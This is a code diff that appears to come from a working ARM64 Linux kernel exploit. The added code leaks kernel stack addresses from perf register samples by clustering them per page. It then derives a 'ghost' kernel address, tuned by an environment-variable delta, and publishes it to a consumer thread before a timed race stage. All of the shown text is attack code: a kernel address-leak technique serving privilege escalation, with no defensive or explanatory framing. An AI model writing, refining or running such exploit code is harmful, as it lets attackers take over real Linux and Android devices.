@@ -373,17 +373,17 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
     if (seq == 0 || seq == seen) {
-      /* PRE-ARM SP DISCOVERY (delivery gate): while unarmed (the spin
-       * window), poll the waiter's blocked-in-select SP so g_ghost_kva
-       * is published BEFORE the final stamps — the handoff arms this
-       * thread only after the last re-stamp, so the SP must come from
-       * here, not the guard. */
-      if (!g_ghost_kva && tid_spin_getsp(atomic_load(&waiter_tid),
-                                         &g_ghost_kva) == 0) {
+      /* GHOST KVA (delivery gate): the waiter-side perf cluster hint
+       * (g_waiter_stack_hint, published by the self-leak mid-route) plus
+       * PSELECT_GHOST_DELTA (QEMU-calibrated) gives the ghost address;
+       * the /proc-syscall SP path was USER-sp (dead end, kept for
+       * reference). Published here pre-arm so the final stamps carry it. */
+      if (!g_ghost_kva && g_waiter_stack_hint) {
         long delta = env_int_range("PSELECT_GHOST_DELTA", 0, -0x2000,
                                    0x2000);
-        g_ghost_kva = (uintptr_t)((long)g_ghost_kva + delta);
-        pr_info("spin-SP ghost=%lx (delta=%ld)\n",
+        g_ghost_kva =
+            (uintptr_t)((long)g_waiter_stack_hint + delta);
+        pr_info("ghost=%lx = hint%+ld (self-lock will arm)\n",
                 (unsigned long)g_ghost_kva, delta);
       }
       __asm__ volatile("yield" ::: "memory");
@@ -1751,6 +1751,11 @@ static int perf_collect(int pid, struct perf_leak *out) {
   size_t dsz = 4096 * 32;
   uint64_t pos = hdr->data_tail;
   int n_hi = 0, n_samp = 0, n_ip_log = 0;
+  uint64_t vm_page[16], vm_top[16];
+  int vm_pn[16];
+  memset(vm_page, 0, sizeof(vm_page));
+  memset(vm_pn, 0, sizeof(vm_pn));
+  memset(vm_top, 0, sizeof(vm_top));
   uintptr_t x28s[PERF_MAX_CAND];
   int nx28 = 0;
   while (pos < head) {
@@ -1778,6 +1783,34 @@ static int perf_collect(int pid, struct perf_leak *out) {
       if (abi == 1 || abi == 2) {
         uint64_t *regs = (uint64_t *)p;
         uint64_t r28 = regs[28];
+        /* STACK CLUSTER (waiter-side): vmap values cluster by page on the
+         * CURRENT thread's kernel stack (perfdump-validated fingerprint)
+         * — the ghost lives in the same cluster on this thread. */
+        for (int ri = 0; ri < 33; ri++) {
+          uint64_t v = regs[ri];
+          if (v >= 0xffffffc000000000ULL && v < 0xfffffffe00000000ULL) {
+            uint64_t pg = v & ~0xfffull;
+            int fi = -1;
+            for (int u = 0; u < 16; u++) {
+              if (vm_page[u] == pg) {
+                fi = u;
+                break;
+              }
+              if (vm_page[u] == 0) {
+                vm_page[u] = pg;
+                vm_pn[u] = 0;
+                vm_top[u] = v;
+                fi = u;
+                break;
+              }
+            }
+            if (fi >= 0) {
+              vm_pn[fi]++;
+              if ((v & 0xfull) >= (vm_top[fi] & 0xfull))
+                vm_top[fi] = v;
+            }
+          }
+        }
         /* User-only PMU still samples kernel IPs (ffffffdc…) with
          * x28=current. Ignore userspace x28. */
         int ker_ip = (ip >= 0xffffffc000000000ULL);
@@ -1793,6 +1826,18 @@ static int perf_collect(int pid, struct perf_leak *out) {
       }
     }
     pos += ev->size;
+  }
+  {
+    int best = -1;
+    for (int u = 0; u < 16; u++)
+      if (vm_page[u] && (best < 0 || vm_pn[u] > vm_pn[best]))
+        best = u;
+    if (best >= 0 && vm_pn[best] >= 8) {
+      g_waiter_stack_hint = (uintptr_t)vm_top[best];
+      pr_info("waiter stack cluster: page=%llx top=%llx n=%d\n",
+              (unsigned long long)vm_page[best],
+              (unsigned long long)vm_top[best], vm_pn[best]);
+    }
   }
   hdr->data_tail = head;
   munmap(buf, msz);
